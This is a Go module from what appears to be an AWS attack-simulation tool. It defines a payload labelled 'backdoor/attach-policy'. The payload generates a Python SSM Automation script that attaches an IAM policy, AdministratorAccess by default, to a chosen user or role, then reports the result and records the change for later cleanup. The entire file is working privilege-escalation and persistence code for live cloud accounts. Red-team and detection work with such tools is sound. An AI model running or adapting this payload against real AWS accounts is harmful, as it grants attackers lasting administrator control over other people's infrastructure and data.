// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"
	"strings"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// AutomationBackdoorAttachPolicyPayload attaches a policy to an IAM user or role
// via an SSM Automation aws:executeScript Python step.
type AutomationBackdoorAttachPolicyPayload struct{}

func init() {
	payloads.Register(&AutomationBackdoorAttachPolicyPayload{})
}

func (p *AutomationBackdoorAttachPolicyPayload) GetName() string {
	return "backdoor/attach-policy"
}

func (p *AutomationBackdoorAttachPolicyPayload) GetDescription() string {
	return "Attach a policy to an IAM user or role via SSM Automation Python step"
}

func (p *AutomationBackdoorAttachPolicyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSMAutomation,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *AutomationBackdoorAttachPolicyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN, tries both if plain name)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *AutomationBackdoorAttachPolicyPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
	}
	return nil
}

func (p *AutomationBackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
	targetARN := options["TARGET_ARN"]
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	code := fmt.Sprintf(`import boto3

target = '%s'
policy_arn = '%s'

def script_handler(events, context):
    iam = boto3.client('iam')

    principal_type = None
    principal_name = target

    if target.startswith('arn:'):
        if ':user/' in target:
            principal_type = 'user'
            principal_name = target.split(':user/')[-1]
        elif ':role/' in target:
            principal_type = 'role'
            principal_name = target.split(':role/')[-1]

    try:
        if principal_type == 'role':
            iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
        elif principal_type == 'user':
            iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
        else:
            try:
                iam.attach_user_policy(UserName=principal_name, PolicyArn=policy_arn)
                principal_type = 'user'
            except iam.exceptions.NoSuchEntityException:
                iam.attach_role_policy(RoleName=principal_name, PolicyArn=policy_arn)
                principal_type = 'role'

        return {
            'Status': 'Success',
            'principal_type': principal_type,
            'principal_name': principal_name,
            'policy_arn': policy_arn,
        }
    except Exception as e:
        return {'Status': 'Error', 'message': str(e)}
`, targetARN, policyArn)

	return code, nil
}

func (p *AutomationBackdoorAttachPolicyPayload) ProcessResult(result string) (string, error) {
	if result == "" {
		return "", nil
	}

	status := extractJSONField(result, "Status")
	if status == "Error" {
		errMsg := extractJSONField(result, "message")
		return fmt.Sprintf("Error attaching policy: %s\n", errMsg), nil
	}

	principalName := extractJSONField(result, "principal_name")
	principalType := extractJSONField(result, "principal_type")
	policyARN := extractJSONField(result, "policy_arn")
	if principalName == "" {
		return result, nil
	}

	policyName := policyARN
	if idx := strings.LastIndex(policyARN, "/"); idx != -1 {
		policyName = policyARN[idx+1:]
	}

	return fmt.Sprintf("Successfully attached %s to %s %s.\n", policyName, principalType, principalName), nil
}

// ReportSideEffects returns the policy attachment as a tracked modification.
func (p *AutomationBackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	policyName := "AdministratorAccess"
	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
		policyName = policyArn[idx+1:]
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}
